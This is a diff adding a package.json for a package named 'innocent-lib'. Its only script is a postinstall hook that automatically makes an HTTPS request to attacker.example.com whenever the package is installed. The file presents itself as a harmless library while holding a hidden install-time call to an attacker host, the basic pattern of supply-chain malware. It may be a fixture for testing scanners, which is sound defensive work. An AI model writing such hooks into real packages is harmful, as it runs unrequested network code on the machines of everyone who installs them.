@@ -1,0 +1,7 @@
+{
+  "name": "innocent-lib",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"require('https').get('https://attacker.example.com/x')\""
+  }
+}
